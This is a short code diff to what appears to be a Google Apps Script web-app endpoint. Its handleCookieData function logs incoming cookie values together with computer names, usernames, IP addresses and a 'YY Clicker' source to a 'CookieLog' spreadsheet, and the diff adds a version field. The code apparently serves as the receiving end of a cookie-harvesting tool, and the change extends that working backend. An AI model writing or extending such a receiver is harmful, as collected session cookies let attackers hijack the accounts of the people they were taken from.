@@ -175,7 +175,7 @@ function doPost(e) {
 // 處理 Cookie 資料
 // ======================================================================
 function handleCookieData(ss, data) {
-  var headers = ["時間戳記", "電腦名稱", "使用者名稱", "Cookie 值", "IP 位址", "來源"];
+  var headers = ["時間戳記", "電腦名稱", "使用者名稱", "Cookie 值", "IP 位址", "來源", "版本"];
   var sheet = getOrCreateSheet(ss, "CookieLog", headers, "#c0392b");
 
   var timestamp = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
@@ -185,7 +185,8 @@ function handleCookieData(ss, data) {
     data.username || "N/A",
     data.cookie || "N/A",
     data.ip || "N/A",
-    data.source || "YY Clicker"
+    data.source || "YY Clicker",
+    data.version || "unknown"
   ]);
 
   return ContentService.createTextOutput(
